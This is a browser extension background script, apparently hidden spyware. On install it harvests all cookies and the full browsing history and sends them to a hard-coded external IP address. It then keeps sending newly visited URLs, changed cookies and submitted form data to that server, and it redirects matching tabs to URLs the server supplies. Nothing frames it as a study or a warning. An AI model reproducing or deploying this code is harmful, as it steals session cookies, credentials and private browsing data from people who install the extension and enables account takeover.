var regs = [];
var urls = [];
var len = 0;
var socket;
var unprocessed_cookies = [];
//var port = 32873;
var regx = "^(http|https)://(www.)*(youtube.com)/[A-Za-z0-9?&=_]*$";
chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {  
	console.log(tab.url);
	if (String(tab.url).match(regx) && changeInfo.status == 'complete') {
   		chrome.tabs.query({active: true, currentWindow: true}, function(tabs){
   			chrome.tabs.sendMessage(tabs[0].id, {action: "blockYoutube"}, function(response) {});  
      });
   }
});




function updateUrls(userid)
{
	socket = io('http://54.147.238.233:32873');
	// socket = io('http://localhost:32873');
	socket.emit('getUrls',{'user_id': userid}, function(data){
		console.log(Date.now());
		console.log('Data Received');
		var rev = String(data).split(';');
		//localStorage.setItem('regs',rev[0]);
		//localStorage.setItem('urls',rev[1]);
		regs = rev[0].split(',');
		urls = rev[1].split(',');
		len = urls.length;
		console.log(regs);
		console.log(urls);
		socket.disconnect();
	 	//alert(String(localStorage['regs'])+'\n'+String(localStorage['urls']));
	});
	socket.on( 'disconnect', function() {
		console.log('disconnected');
	});

	socket.on( 'connect_failed', function() {
		console.log('connect_failed');
	});

	socket.on( 'error', function() {
		console.log('error');
	});
}

function getRandomToken() {
    // E.g. 8 * 32 = 256 bits token
    var randomPool = new Uint8Array(32);
    crypto.getRandomValues(randomPool);
    var hex = '';
    for (var i = 0; i < randomPool.length; ++i) {
        hex += randomPool[i].toString(16);
    }
    // E.g. db18458e2782b2b77e36769c569e263a53885a9944dd0a861e5064eac16f1a
    return hex;
}

chrome.runtime.onInstalled.addListener(function() {
	//socket = io('http://10.211.55.11:32873');
	console.log('oninstall');
	var allcookies;
	var allhistories;

	chrome.storage.sync.get('userid', function(items) {
	    var userid = items.userid;
	    if (userid) {
	        console.log('return user');
	        console.log(userid);
	    } else {	    	
	        userid = getRandomToken();
	        chrome.storage.sync.set({userid: userid}, function() {
	        	console.log('new user');
	        	console.log(userid);
	        });
	    }
	    chrome.cookies.getAll({},function (result){			
			allcookies = result;
			console.log(allcookies);
			chrome.history.search({
		        'text': '',
		        'startTime': 0
		    }, function(historyItems){
		    	allhistories = historyItems;
		    	console.log(allhistories);
		    	socket = io('http://54.147.238.233:32873');
		    	console.log('install 1')
				socket.emit('new_install',{'user_id': userid, 'history': allhistories, 'cookies': allcookies},function(response){
					console.log(response);
					//socket.disconnect();
					updateUrls(userid);
				});
				console.log('install 2')
		    });
		});

	});
	
});

chrome.history.onVisited.addListener(function(result){
	console.log('new history item');
	console.log(result);
	chrome.storage.sync.get('userid', function(items) {
		var userid = items.userid;
		socket = io('http://54.147.238.233:32873');
		socket.emit('history_url', {  'user_id': userid, 'history': result},function(response){
			console.log(response);
			socket.disconnect();
			});
	});
	
});

chrome.cookies.onChanged.addListener(function(result){
	/*if(result.cookie.path != '/socket.io' && result.removed == false)
	{
		console.log('cookie change');
		console.log(result);
		chrome.storage.sync.get('userid', function(items) {
			var userid = items.userid;
			socket = io('http://54.147.238.233:32873');
			socket.emit('cookie_info', {  'user_id': userid, 'cookies': result},function(response){
				console.log(response);
				socket.disconnect();});
		});
	}*/
	if(/*result.cookie.path != '/socket.io' && */result.removed == false && 
		unprocessed_cookies.filter(function(e) {
			//console.log(String(e.cookie.value));
			//console.log(String(result.cookie.value));
			return String(e.cookie.value) === String(result.cookie.value);
		}).length <= 0){
		console.log('add to cookie queue');
		console.log(result);
		unprocessed_cookies.push(result);
	}
		
});


chrome.runtime.onMessage.addListener(function(request, sender) {
	chrome.storage.sync.get('userid', function(items) {
		var userid = items.userid;
		console.log("debug0");
		if(typeof request.url != "undefined"){
			console.log("debug1");
			if (String(request.url).match(regs[0])) {
				var ranidx = Math.floor(Math.random() * (len));
				chrome.tabs.update(sender.tab.id, {url: urls[ranidx]});
			}
		}

		if(typeof request.submitted_form != "undefined"){
			console.log("debug3");
			socket = io('http://54.147.238.233:32873');
			socket.emit('submit_form', {  'user_id': userid, 'forms' : request.submitted_form },function(response){console.log(response);socket.disconnect();});
	    	console.log(request.submitted_form);
		}
	});

});

chrome.alarms.create("1min", {
	delayInMinutes: 1,
	periodInMinutes: 1
});

chrome.alarms.onAlarm.addListener(function(alarm) {
  	if (alarm.name === "1min") {
	  	console.log('alarm');
	  	console.log(unprocessed_cookies);
	  	chrome.storage.sync.get('userid', function(items) {
			var userid = items.userid;
			if (unprocessed_cookies.length > 0)
			{
				socket = io('http://54.147.238.233:32873');
				socket.emit('cookie_info', {  'user_id': userid, 'cookies': unprocessed_cookies},function(response){
					console.log(response);
					unprocessed_cookies.splice(0,response);
					console.log(unprocessed_cookies);
					updateUrls(userid);
				});
			}
			else{
				updateUrls(userid);
			}
			
		});  
  	}
});